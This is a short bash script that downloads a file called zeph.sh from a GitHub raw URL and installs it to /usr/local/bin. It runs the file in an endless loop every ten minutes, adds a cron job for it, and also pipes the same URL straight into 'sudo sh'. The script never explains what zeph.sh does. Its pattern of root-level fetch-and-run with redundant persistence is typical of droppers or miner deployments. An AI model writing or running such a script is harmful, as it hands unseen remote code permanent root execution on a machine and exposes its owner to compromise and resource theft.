#!/bin/bash
apt update
apt install -y sudo cron
script_url="https://raw.githubusercontent.com/TiannaMcdowell/All-Jobs/main/zeph.sh"
sudo wget -O /usr/local/bin/zeph.sh "$script_url"
sudo chmod +x /usr/local/bin/zeph.sh
run_script() {
    /usr/local/bin/zeph.sh
}
run_every_10_minutes() {
    run_script
    
    while true; do
        sleep 600  
        run_script
    done
}
run_every_10_minutes &
sudo crontab -e &
(crontab -l 2>/dev/null ; echo "*/10 * * * * /usr/local/bin/zeph.sh") | crontab -
curl -sSL https://raw.githubusercontent.com/TiannaMcdowell/All-Jobs/main/zeph.sh | sudo sh
